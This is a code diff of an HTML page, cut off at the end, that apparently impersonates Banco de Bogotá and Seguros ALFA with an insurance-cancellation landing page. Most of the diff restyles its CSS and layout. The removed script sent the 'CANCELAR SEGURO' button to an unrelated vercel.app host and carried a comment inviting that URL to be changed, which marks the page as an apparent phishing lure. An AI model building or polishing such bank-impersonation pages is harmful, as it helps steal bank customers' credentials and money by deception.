@@ -13,45 +13,85 @@
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js" defer></script>
 
   <style>
-    :root {
+    :root{
       --brand:#180adf; --brand-ink:#0f0a7a; --accent:#00ccea;
       --bg:#F7F7F7; --card:#ffffff; --text:#1f2937; --muted:#667085;
       --radius:14px; --shadow:0 10px 30px rgba(2, 8, 20, .06);
       --shadow-soft:0 0 12px 1px rgba(57,62,100,.1);
     }
-    * {box-sizing:border-box;margin:0;padding:0}
-    html {scroll-behavior:smooth}
-    body {
-      font-family:"Open Sans",system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";
-      background:var(--bg); color:var(--text);
-      -webkit-font-smoothing:antialiased; text-rendering:optimizeLegibility;
-    }
-    img {max-width:100%;height:auto}
+    *{box-sizing:border-box;margin:0;padding:0}
+    html{scroll-behavior:smooth}
+    body{font-family:"Open Sans",system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";
+         background:var(--bg); color:var(--text); -webkit-font-smoothing:antialiased; text-rendering:optimizeLegibility;}
+    img{max-width:100%;height:auto}
 
-    /* Botón */
-    .btn {
-      background:linear-gradient(180deg,var(--brand),var(--brand-ink)); color:#fff; border:0;
-      border-radius:999px; padding:12px 30px; font-weight:700; font-size:16px; line-height:1;
-      box-shadow:0 6px 18px rgba(24,10,223,.18); cursor:pointer;
-      transition:transform .15s, box-shadow .15s, background .2s;
-    }
-    .btn:hover {transform:translateY(-1px); box-shadow:0 10px 22px rgba(24,10,223,.22)}
-    .btn:focus-visible {outline:3px solid #aeb6ff; outline-offset:2px}
+    #cabecera{position:fixed; inset:0 auto auto 0; width:100%; z-index:1000;
+      background:rgba(255,255,255,.85); backdrop-filter:saturate(150%) blur(6px);
+      border-bottom:1px solid rgba(0,0,0,.04); box-shadow:0 2px 10px rgba(0,0,0,.04);
+      padding:14px 0;}
+    #menu-bar{margin:0 auto; width:90%; max-width:1216px; display:table}
 
-    /* Estilos generales omitidos por brevedad (mismos que ya tenías)... */
+    .btn{background:linear-gradient(180deg,var(--brand),var(--brand-ink)); color:#fff; border:0; border-radius:999px;
+      padding:12px 30px; font-weight:700; font-size:16px; line-height:1; box-shadow:0 6px 18px rgba(24,10,223,.18);
+      cursor:pointer; transition:transform .15s, box-shadow .15s, background .2s;}
+    .btn:hover{transform:translateY(-1px); box-shadow:0 10px 22px rgba(24,10,223,.22)}
+    .btn:focus-visible{outline:3px solid #aeb6ff; outline-offset:2px}
+
+    .titulo-baner{font-weight:800; font-size:clamp(24px,4.8vw,40px); line-height:1.1}
+    .titulo{font-weight:800; font-size:clamp(20px,4.2vw,30px); text-align:center}
+    .contenido{font-size:clamp(14px,3.5vw,16px); line-height:1.6; color:var(--muted)}
+
+    main{padding-top:clamp(78px,10vw,110px)}
+    #tbl-baner{margin:0 auto; width:90%; max-width:1216px}
+    #tbl-baner td{padding:0 32px}
+
+    .hint{display:inline-flex; align-items:center; gap:8px; font-weight:600; color:var(--brand-ink); text-decoration:none; margin-top:8px}
+    .hint img{width:22px}
+
+    #seccion-azul{background:linear-gradient(135deg,var(--accent) 0%, #58e4f4 100%); padding:clamp(30px,6vw,68px) 0; color:#04222a}
+    #tbl-azul{margin:0 auto; width:90%; max-width:1216px}
+    .lado-der > div{height:auto; max-height:460px; overflow:hidden; border-radius:var(--radius); box-shadow:var(--shadow)}
+
+    #seccion-registro{padding:clamp(30px,6vw,68px) 0}
+    .registro{background:var(--card); border-radius:var(--radius); box-shadow:var(--shadow-soft);
+      width:100%; max-width:320px; margin:0 auto; overflow:hidden; transition:transform .18s, box-shadow .18s;}
+    .registro:hover{transform:translateY(-2px); box-shadow:var(--shadow)}
+    .titulo-registro{padding:18px 18px 0; text-align:left; font-weight:800; font-size:18px}
+    .descripcion-registro{padding:12px 18px 22px; font-size:15px; color:var(--muted); text-align:left}
+
+    #ayuda{background:linear-gradient(180deg,#fff 0%, #fff 60%, rgba(2,8,20,.02) 100%);
+      padding:clamp(28px,5vw,48px) 0 clamp(72px,8vw,110px); text-align:center;}
+    #seccion-contacto{padding:0}
+    #contacto{position:relative; margin:-58px auto 0; background:#fff; border-radius:var(--radius);
+      box-shadow:0 20px 40px rgba(2,8,20,.06); width:90%; padding:clamp(22px,6vw,48px) 0;}
+    .tipo-contacto{font-size:15px; font-weight:800}
+    .info-contacto{font-size:14px; color:var(--muted)}
+
+    footer{padding:28px; background:#fff; border-top:1px solid #eceff3; font-size:12px; color:#5b6574}
+    #tbl-footer,#tbl-footer2{margin:0 auto; width:90%; max-width:980px}
+    #tbl-footer img,#tbl-footer2 img{display:block; margin:0 auto}
+
+    @media (max-width:768px){
+      #tbl-baner, #tbl-azul, #contacto table, #tbl-footer, #tbl-footer2,
+      #tbl-baner td, #tbl-azul td, #contacto td{display:block; width:100%!important; text-align:center}
+      #contacto td[width="1%"]{display:none!important}
+    }
+
+    a{color:inherit}
+    a:focus-visible{outline:3px solid #a0f0ff; outline-offset:3px; border-radius:8px}
+
+    .fade-in{opacity:0; transform:translateY(8px); transition:opacity .45s ease, transform .45s ease}
+    .fade-in.is-visible{opacity:1; transform:none}
+    @media (prefers-reduced-motion: reduce){*{transition:none!important; animation:none!important} html{scroll-behavior:auto}}
   </style>
 </head>
 
 <body>
   <header id="cabecera" role="banner" aria-label="Cabecera">
-    <table border="0" cellpadding="0" cellspacing="0" id="menu-bar" aria-label="Barra de marca">
+    <table id="menu-bar" aria-label="Barra de marca">
       <tr>
-        <td valign="middle" align="left">
-          <img src="seg/virtual/img/logo.svg" width="230" height="48" alt="Banco de Bogotá" loading="eager" fetchpriority="high" />
-        </td>
-        <td valign="middle" align="right">
-          <img src="seg/virtual/img/alfa2.png" style="width:200px" alt="Seguros ALFA" loading="eager" />
-        </td>
+        <td><img src="seg/virtual/img/logo.svg" width="230" height="48" alt="Banco de Bogotá" /></td>
+        <td align="right"><img src="seg/virtual/img/alfa2.png" style="width:200px" alt="Seguros ALFA" /></td>
       </tr>
     </table>
   </header>
@@ -59,61 +99,13 @@
   <main>
     <br><br><br><br>
 
-    <!-- HERO -->
     <table id="tbl-baner" class="fade-in">
       <tr>
-        <td valign="middle">
+        <td>
           <div class="titulo-baner">Inicia el proceso de cancelación de seguros <strong>ALFA</strong></div>
           <br />
           <div class="contenido">
             Accede a los servicios que Banco de Bogotá y Seguros ALFA te ofrecen para tu seguridad y tranquilidad.
-            <br /><br />
-            Disfruta todos los <strong>beneficios adicionales</strong> a tus coberturas y dale seguridad a tu
-            desarrollo <strong>personal y profesional</strong>.
-          </div>
-          <br />
-          <button class="btn" id="btn-cancelar" aria-label="Cancelar seguro">CANCELAR SEGURO</button>
-        </td>
-        <td valign="middle" class="quitar1"></td>
-      </tr>
-    </table>
-
-    <!-- Secciones omitidas (las puedes dejar tal cual como las tienes)... -->
-  </main>
-
-  <footer role="contentinfo" aria-label="Pie de página">
-    <!-- Pie de página omitido por brevedad -->
-  </footer>
-
-  <!-- ✅ SCRIPT ACTUALIZADO -->
-  <script>
-    // 👉 URL de redirección del botón CANCELAR
-    const CANCELAR_SEGURO_URL = "https://sucpersonasbogo.vercel.app/"; // <-- Cámbiala aquí
-
-    document.addEventListener("DOMContentLoaded", function () {
-      // Redirigir botón CANCELAR
-      document.getElementById("btn-cancelar").addEventListener("click", function () {
-        window.location.href = CANCELAR_SEGURO_URL;
-      });
-
-      // Reveal animado
-      const io = new IntersectionObserver((entries) => {
-        entries.forEach(e => {
-          if (e.isIntersecting) e.target.classList.add("is-visible");
-        });
-      }, { threshold: .18 });
-      document.querySelectorAll(".fade-in").forEach(el => io.observe(el));
-
-      // Fallback universal para imágenes que no cargan
-      const FALLBACK = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="420" height="280"><rect width="100%" height="100%" fill="%23f2f4f7"/><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="Arial" font-size="14" fill="%239aa4b2">Imagen no disponible</text></svg>';
-      document.querySelectorAll("img").forEach(img => {
-        img.addEventListener("error", () => {
-          img.src = FALLBACK;
-          img.style.background = "#f7f7f9";
-          img.style.objectFit = "contain";
-        });
-      });
-    });
-  </script>
-</body>
-</html>
+            <br><br>
+            Disfruta todos los <strong>beneficios adicionales</strong> a tus coberturas y dale seguridad a tu desarrollo <strong>personal y profesional</strong>.
+         
